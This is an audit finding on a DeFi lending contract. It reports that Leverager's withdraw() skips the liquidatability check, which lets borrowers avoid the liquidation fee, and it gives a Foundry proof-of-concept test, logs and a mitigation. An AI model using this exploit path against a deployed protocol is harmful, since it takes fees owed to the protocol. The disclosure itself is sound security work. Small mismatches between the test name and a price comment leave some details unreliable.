# Withdrawal is possible even for a liquidatable position.

### Summary

When a position is in liquidation risk and the collateral value of the position is still greater than accrued borrowed value, the protocol takes liquidation fee.

By the way, the `withdraw()` function in the `leverager` contract doesn't check if a position to withdraw is liquidatable.

Therefore, an owner of a liquidatable position can successfully withdraw his position without paying liquidation fee.

### Root Cause

The [`Leverager::withdraw()`](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Leverager.sol#L209-L293) never calls `isLiquidateable()` function, making a liquidatable position withdrawable.

### Internal pre-conditions

- A position should be liquidatable

### External pre-conditions

*None*

### Attack Path

- The owner of a liquidatable position calls `withdraw()` function.

### Impact

Owners of liquidatable positions will be able to withdraw their collaterals without paying liquidation fee.

### PoC

The following test case demonstrates the difference between withdrawing and liquidating a liquidatable position:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/console.sol";
import "forge-std/Test.sol";

import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";

import {MockOracle} from "./utils/MockOracle.sol";
import {ILeverager} from "../src/interfaces/ILeverager.sol";
import {ILendingPool} from "../src/interfaces/ILendingPool.sol";
import {IStrategy} from "../src/interfaces/IStrategy.sol";
import {IMainnetRouter} from "../src/interfaces/IMainnetRouter.sol";

import {LeveragerTest} from "./Leverager.t.sol";

contract LeveragerPocTest is LeveragerTest {
    function setUp() public override {
        super.setUp();
    }

    function test_M01_WithdrawForLiquidatable() external {
        address feeRecipient = address(0xfee);

        vm.startPrank(owner);
        ILeverager(leverager).setLiquidationFee(500); // 5% of liquidation fee
        ILeverager(leverager).setFeeRecipient(feeRecipient);
        vm.stopPrank();

        vm.startPrank(lender);
        weth.approve(lendingPool, 100e18);
        deal(address(weth), lender, 100e18);

        ILendingPool(lendingPool).deposit(address(weth), 100e18, lender);

        skip(6 minutes);

        vm.startPrank(depositor);
        ILeverager.LeverageParams memory lp;
        lp.amount0In = 0.5e8;
        lp.amount1In = 50_000e6;
        lp.vault0In = 1e8;
        lp.vault1In = 100_000e6;
        lp.vault = vault;
        lp.maxBorrowAmount = 100e18;
        lp.denomination = address(weth);

        IMainnetRouter.ExactOutputParams memory ep0;
        bytes memory _path = abi.encodePacked(address(wbtc), uint24(3000), address(weth));
        ep0.path = _path;
        ep0.deadline = block.timestamp;
        ep0.amountInMaximum = type(uint256).max;
        ep0.recipient = leverager;
        lp.swapParams1 = abi.encode(ep0);

        IMainnetRouter.ExactOutputParams memory ep1;
        _path = abi.encodePacked(address(usdc), uint24(3000), address(weth));
        ep1.path = _path;
        ep1.deadline = block.timestamp;
        ep1.amountInMaximum = type(uint256).max;
        ep1.recipient = leverager;
        lp.swapParams2 = abi.encode(ep1);

        deal(address(wbtc), depositor, 0.5e8);
        deal(address(usdc), depositor, 50_000e6);
        wbtc.approve(leverager, type(uint256).max);
        usdc.approve(leverager, type(uint256).max);

        uint256 positionId = ILeverager(leverager).openLeveragedPosition(lp);
        vm.stopPrank();

        skip(52 weeks);

        MockOracle(wbtcOracle).setPrice(65000e18); // $60,000/WBTC
        MockOracle(wethOracle).setPrice(4000e18); // $4,000/WETH
        assertEq(ILeverager(leverager).isLiquidateable(positionId), true);

        uint256 snapshotId = vm.snapshot();

        vm.startPrank(liquidator);
        deal(address(weth), liquidator, 100e18);
        weth.approve(leverager, 100e18);
        uint256 liquidatorWbtcBalance = wbtc.balanceOf(liquidator);
        uint256 liquidatorUsdcBalance = usdc.balanceOf(liquidator);

        ILeverager.LiquidateParams memory liqParams;
        liqParams.id = positionId;
        ILeverager(leverager).liquidatePosition(liqParams);
        console.log("Liquidator Wbtc received after liq.", wbtc.balanceOf(liquidator) - liquidatorWbtcBalance);
        console.log("Liquidator Usdc received after liq.", usdc.balanceOf(liquidator) - liquidatorUsdcBalance);

        vm.stopPrank();

        vm.revertTo(snapshotId);

        vm.startPrank(depositor);
        deal(address(weth), depositor, 100e18);
        weth.approve(leverager, 100e18);
        uint256 depositorWbtcBalance = wbtc.balanceOf(depositor);
        uint256 depositorUsdcBalance = usdc.balanceOf(depositor);

        ILeverager.WithdrawParams memory withdrawParams;
        withdrawParams.id = positionId;
        withdrawParams.pctWithdraw = 1e18;
        ILeverager(leverager).withdraw(withdrawParams);
        console.log("Borrower Wbtc received after withdraw", wbtc.balanceOf(depositor) - depositorWbtcBalance);
        console.log("Borrower Usdc received after withdraw", usdc.balanceOf(depositor) - depositorUsdcBalance);
        vm.stopPrank();
    }
}
```

Output Logs:

```bash
[PASS] test_H03_WithdrawForLiquidatable() (gas: 2969497)
Logs:
  Liquidator Wbtc received after liq. 99919734
  Liquidator Usdc received after liq. 99919734623
  Borrower Wbtc received after withdraw 99999999
  Borrower Usdc received after withdraw 99999999999
```

As can be seen from the logs, the depositor bypassed paying the liquidation fee by withdrawing.

### Mitigation

Should ensure that a position to withdraw is not liquidatable.
